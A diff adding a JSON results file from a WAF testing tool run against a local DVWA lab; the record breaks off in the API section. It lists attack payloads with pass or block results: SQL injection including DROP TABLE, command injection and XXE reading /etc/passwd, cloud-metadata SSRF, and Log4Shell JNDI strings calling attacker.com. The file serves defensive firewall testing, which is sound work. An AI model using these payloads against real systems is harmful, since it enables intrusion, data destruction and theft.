@@ -1,0 +1,1498 @@
+{
+  "tool": "WAF Tester v1.0",
+  "target": "http://localhost/DVWA/vulnerabilities/brute/",
+  "timestamp": "2026-04-14T02:37:52.443Z",
+  "summary": {
+    "owasp": {
+      "total": 43,
+      "blocked": 1,
+      "passed": 42,
+      "errors": 0,
+      "score": 2
+    },
+    "ratelimit": {
+      "total": 3,
+      "blocked": 0,
+      "passed": 3,
+      "errors": 0,
+      "score": 0
+    },
+    "bot": {
+      "total": 10,
+      "blocked": 0,
+      "passed": 10,
+      "errors": 0,
+      "score": 0
+    },
+    "bypass": {
+      "total": 15,
+      "blocked": 1,
+      "passed": 14,
+      "errors": 0,
+      "score": 7
+    },
+    "api": {
+      "total": 10,
+      "blocked": 0,
+      "passed": 10,
+      "errors": 0,
+      "score": 0
+    },
+    "bizlogic": {
+      "total": 8,
+      "blocked": 0,
+      "passed": 8,
+      "errors": 0,
+      "score": 0
+    }
+  },
+  "results": {
+    "owasp": [
+      {
+        "id": "sqli-1",
+        "name": "SQLi - Classic OR",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "' OR '1'='1",
+        "status": 302,
+        "latency": 10,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-2",
+        "name": "SQLi - UNION SELECT",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "' UNION SELECT 1,2,3--",
+        "status": 302,
+        "latency": 20,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-3",
+        "name": "SQLi - Blind time delay",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "'; WAITFOR DELAY '0:0:5'--",
+        "status": 302,
+        "latency": 5,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-4",
+        "name": "SQLi - Error-based (extractvalue)",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "' AND extractvalue(1,concat(0x7e,version()))--",
+        "status": 302,
+        "latency": 12,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-5",
+        "name": "SQLi - Stacked queries",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "'; DROP TABLE users--",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-6",
+        "name": "SQLi - Hex encoding",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "' OR 0x313d31--",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-7",
+        "name": "SQLi - Comment bypass (/**/ )",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "'/**/OR/**/1=1--",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-8",
+        "name": "SQLi - Out-of-band DNS",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89"
+        ],
+        "payload": "'; EXEC master..xp_dirtree '//attacker.com/a'--",
+        "status": 302,
+        "latency": 5,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-9",
+        "name": "SQLi - MySQL SLEEP",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "' OR SLEEP(5)--",
+        "status": 302,
+        "latency": 7,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-10",
+        "name": "SQLi - Whitespace tab bypass",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89"
+        ],
+        "payload": "'\tOR\t'1'='1",
+        "status": 302,
+        "latency": 8,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-11",
+        "name": "SQLi - Boolean blind",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "' AND 1=1--",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "sqli-12",
+        "name": "SQLi - Second-order (stored)",
+        "category": "SQL Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89"
+        ],
+        "payload": "admin'--",
+        "status": 302,
+        "latency": 3,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-1",
+        "name": "XSS - Script tag",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "<script>alert(1)</script>",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-2",
+        "name": "XSS - img onerror",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "<img src=x onerror=alert(1)>",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-3",
+        "name": "XSS - SVG onload",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79",
+          "NIST:SI-10"
+        ],
+        "payload": "<svg onload=alert(1)>",
+        "status": 302,
+        "latency": 3,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-4",
+        "name": "XSS - DOM javascript: URI",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "javascript:alert(document.domain)",
+        "status": 302,
+        "latency": 8,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-5",
+        "name": "XSS - Polyglot payload",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79",
+          "NIST:SI-10"
+        ],
+        "payload": "jaVasCript:/*`/*'/*\"/**/(oNcliCk=alert())//%0D%0A//</stYle/</titLe/</scRipt/--!>",
+        "status": 302,
+        "latency": 8,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-6",
+        "name": "XSS - onfocus autofocus",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "<input onfocus=alert(1) autofocus>",
+        "status": 302,
+        "latency": 11,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-7",
+        "name": "XSS - CSS @import",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "<style>@import \"javascript:alert(1)\"</style>",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-8",
+        "name": "XSS - HTML entity bypass",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-9",
+        "name": "XSS - Template literal",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "${alert(1)}",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xss-10",
+        "name": "XSS - Markdown link injection",
+        "category": "Cross-Site Scripting",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "[click](javascript:alert(1))",
+        "status": 302,
+        "latency": 3,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "lfi-1",
+        "name": "Path Traversal - dot-dot-slash",
+        "category": "Path Traversal",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "../../../etc/passwd",
+        "status": 400,
+        "latency": 2,
+        "blocked": true,
+        "confidence": "uncertain",
+        "reason": "HTTP 400 — differs from baseline 302, possible block"
+      },
+      {
+        "id": "lfi-2",
+        "name": "Path Traversal - URL encoded",
+        "category": "Path Traversal",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+        "status": 404,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "lfi-3",
+        "name": "Path Traversal - double encoded",
+        "category": "Path Traversal",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22",
+          "NIST:AC-3"
+        ],
+        "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+        "status": 404,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "lfi-4",
+        "name": "Path Traversal - Windows path",
+        "category": "Path Traversal",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22",
+          "NIST:AC-3"
+        ],
+        "payload": "..\\..\\..\\windows\\win.ini",
+        "status": 404,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "cmdi-1",
+        "name": "Command Injection - semicolon",
+        "category": "Command Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-78",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "; cat /etc/passwd",
+        "status": 302,
+        "latency": 8,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "cmdi-2",
+        "name": "Command Injection - pipe",
+        "category": "Command Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-78",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "| whoami",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "cmdi-3",
+        "name": "Command Injection - backtick",
+        "category": "Command Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-78",
+          "NIST:SI-10"
+        ],
+        "payload": "`id`",
+        "status": 302,
+        "latency": 3,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "cmdi-4",
+        "name": "Command Injection - $() subshell",
+        "category": "Command Injection",
+        "tags": [
+          "OWASP:A03",
+          "CWE-78",
+          "NIST:SI-10"
+        ],
+        "payload": "$(id)",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xxe-1",
+        "name": "XXE - File disclosure",
+        "category": "XXE Injection",
+        "tags": [
+          "OWASP:A05",
+          "CWE-611",
+          "NIST:SI-10",
+          "PCI:6.4"
+        ],
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><",
+        "status": 302,
+        "latency": 7,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "xxe-2",
+        "name": "XXE - SSRF via DTD",
+        "category": "XXE Injection",
+        "tags": [
+          "OWASP:A05",
+          "CWE-611",
+          "NIST:SI-10"
+        ],
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "ssrf-1",
+        "name": "SSRF - localhost admin",
+        "category": "SSRF",
+        "tags": [
+          "OWASP:A10",
+          "CWE-918",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "http://localhost/admin",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "ssrf-2",
+        "name": "SSRF - AWS metadata",
+        "category": "SSRF",
+        "tags": [
+          "OWASP:A10",
+          "CWE-918",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "status": 302,
+        "latency": 3,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "ssrf-3",
+        "name": "SSRF - GCP metadata",
+        "category": "SSRF",
+        "tags": [
+          "OWASP:A10",
+          "CWE-918",
+          "NIST:AC-3"
+        ],
+        "payload": "http://metadata.google.internal/computeMetadata/v1/",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "ssrf-4",
+        "name": "SSRF - file:// protocol",
+        "category": "SSRF",
+        "tags": [
+          "OWASP:A10",
+          "CWE-918"
+        ],
+        "payload": "file:///etc/passwd",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "log4j-1",
+        "name": "Log4Shell - JNDI LDAP",
+        "category": "Known CVE",
+        "tags": [
+          "OWASP:A06",
+          "CWE-917",
+          "NIST:SI-2",
+          "PCI:6.4"
+        ],
+        "payload": "${jndi:ldap://attacker.com/a}",
+        "status": 302,
+        "latency": 11,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "log4j-2",
+        "name": "Log4Shell - JNDI RMI variant",
+        "category": "Known CVE",
+        "tags": [
+          "OWASP:A06",
+          "CWE-917",
+          "NIST:SI-2"
+        ],
+        "payload": "${jndi:rmi://attacker.com/a}",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "log4j-3",
+        "name": "Log4Shell - Nested bypass",
+        "category": "Known CVE",
+        "tags": [
+          "OWASP:A06",
+          "CWE-917",
+          "NIST:SI-2"
+        ],
+        "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "ssti-1",
+        "name": "SSTI - Jinja2 math probe",
+        "category": "SSTI",
+        "tags": [
+          "OWASP:A03",
+          "CWE-94",
+          "NIST:SI-10"
+        ],
+        "payload": "{{7*7}}",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "ssti-2",
+        "name": "SSTI - Twig/Smarty probe",
+        "category": "SSTI",
+        "tags": [
+          "OWASP:A03",
+          "CWE-94",
+          "NIST:SI-10"
+        ],
+        "payload": "{{7*'7'}}",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "redir-1",
+        "name": "Open Redirect - absolute URL",
+        "category": "Open Redirect",
+        "tags": [
+          "OWASP:A01",
+          "CWE-601",
+          "NIST:AC-3"
+        ],
+        "payload": "https://evil.attacker.com",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "redir-2",
+        "name": "Open Redirect - protocol-relative",
+        "category": "Open Redirect",
+        "tags": [
+          "OWASP:A01",
+          "CWE-601",
+          "NIST:AC-3"
+        ],
+        "payload": "//attacker.com/phish",
+        "status": 302,
+        "latency": 9,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      }
+    ],
+    "ratelimit": [
+      {
+        "id": "rl-burst",
+        "name": "Burst Flood (30 simultaneous)",
+        "category": "Rate Limiting",
+        "tags": [
+          "OWASP:A04",
+          "CWE-400",
+          "NIST:SC-5",
+          "PCI:6.4"
+        ],
+        "payload": "30 concurrent GET requests",
+        "status": 302,
+        "latency": 57,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "0 / 30 blocked (429: 0, 403: 0) - threshold: >=6"
+      },
+      {
+        "id": "rl-seq",
+        "name": "Sequential Flood (20 req @ 100ms)",
+        "category": "Rate Limiting",
+        "tags": [
+          "OWASP:A04",
+          "CWE-400",
+          "NIST:SC-5",
+          "PCI:6.4"
+        ],
+        "payload": "20 sequential GET requests, 100ms apart",
+        "status": 302,
+        "latency": 57,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "0 / 20 blocked (429: 0) - threshold: >=1"
+      },
+      {
+        "id": "rl-spoof",
+        "name": "Rate Limit Bypass (X-Forwarded-For rotation)",
+        "category": "Rate Limiting",
+        "tags": [
+          "OWASP:A04",
+          "CWE-400",
+          "NIST:SC-5"
+        ],
+        "payload": "X-Forwarded-For: 10.0.0.1-15",
+        "status": 302,
+        "latency": 8,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "0 / 15 blocked despite spoofed IPs - bypass SUCCEEDED (WAF trusts XFF)"
+      }
+    ],
+    "bot": [
+      {
+        "id": "bot-1",
+        "name": "Missing User-Agent",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "Empty User-Agent header",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-2",
+        "name": "Scanner - sqlmap",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3",
+          "PCI:6.4"
+        ],
+        "payload": "sqlmap user-agent",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-3",
+        "name": "Scanner - Nikto",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3",
+          "PCI:6.4"
+        ],
+        "payload": "Nikto scanner UA",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-4",
+        "name": "Scanner - Nmap NSE",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "Nmap NSE UA",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-5",
+        "name": "Headless Chrome",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "Headless Chrome UA",
+        "status": 302,
+        "latency": 5,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-6",
+        "name": "Python Requests",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "Python requests library",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-7",
+        "name": "curl UA",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "curl user-agent",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-8",
+        "name": "Scrapy Spider",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "Scrapy web scraper",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-9",
+        "name": "Masscan",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284",
+          "NIST:SI-3"
+        ],
+        "payload": "Port scanner UA",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bot-10",
+        "name": "No Accept header",
+        "category": "Bot Detection",
+        "tags": [
+          "OWASP:A04",
+          "CWE-284"
+        ],
+        "payload": "Missing Accept/Accept-Language",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      }
+    ],
+    "bypass": [
+      {
+        "id": "bp-1",
+        "name": "SQLi - Null byte bypass",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "SQLi with null byte",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-2",
+        "name": "SQLi - Case variation",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "Mixed-case OR keyword",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-3",
+        "name": "SQLi - Inline comment obfuscation",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "SQL comment within payload",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-4",
+        "name": "SQLi - Base64 encoded",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89"
+        ],
+        "payload": "Base64-encoded SQLi",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-5",
+        "name": "SQLi - URL encoded keywords",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-89",
+          "NIST:SI-10"
+        ],
+        "payload": "URL-encoded SQLi",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-6",
+        "name": "XSS - Double URL-encode",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79",
+          "NIST:SI-10"
+        ],
+        "payload": "Double-encoded <script>",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-7",
+        "name": "XSS - Unicode fullwidth chars",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79",
+          "NIST:SI-10"
+        ],
+        "payload": "Fullwidth Unicode <script>",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-8",
+        "name": "XSS - HTML entity evasion",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-79"
+        ],
+        "payload": "HTML entities in payload",
+        "status": 302,
+        "latency": 5,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-9",
+        "name": "Header injection (CRLF)",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A03",
+          "CWE-113",
+          "NIST:SI-10"
+        ],
+        "payload": "CRLF in custom header",
+        "status": null,
+        "latency": 0,
+        "blocked": true,
+        "confidence": "high",
+        "reason": "Blocked by Node HTTP layer: Invalid character in header content [\"X-Custom\"]"
+      },
+      {
+        "id": "bp-10",
+        "name": "Host header injection",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A01",
+          "CWE-284",
+          "NIST:AC-3"
+        ],
+        "payload": "Spoofed Host header",
+        "status": 302,
+        "latency": 5,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-11",
+        "name": "HTTP method override",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A01",
+          "CWE-284"
+        ],
+        "payload": "Method override headers",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-12",
+        "name": "Double slash path bypass",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22",
+          "NIST:AC-3"
+        ],
+        "payload": "Double-slash path prefix",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-13",
+        "name": "Semicolon path bypass",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22",
+          "NIST:AC-3"
+        ],
+        "payload": "Semicolon path trick",
+        "status": 404,
+        "latency": 7,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "bp-14",
+        "name": "Protocol-relative SSRF",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A10",
+          "CWE-918"
+        ],
+        "payload": "Protocol-relative URL",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bp-15",
+        "name": "Unicode path normalization",
+        "category": "Bypass",
+        "tags": [
+          "OWASP:A01",
+          "CWE-22"
+        ],
+        "payload": "Unicode path separator bypass",
+        "status": 302,
+        "latency": 7,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      }
+    ],
+    "api": [
+      {
+        "id": "api-1",
+        "name": "GraphQL Introspection",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A05",
+          "CWE-284",
+          "NIST:AC-3"
+        ],
+        "payload": "GraphQL Introspection",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-2",
+        "name": "GraphQL Batch Query Flood",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A04",
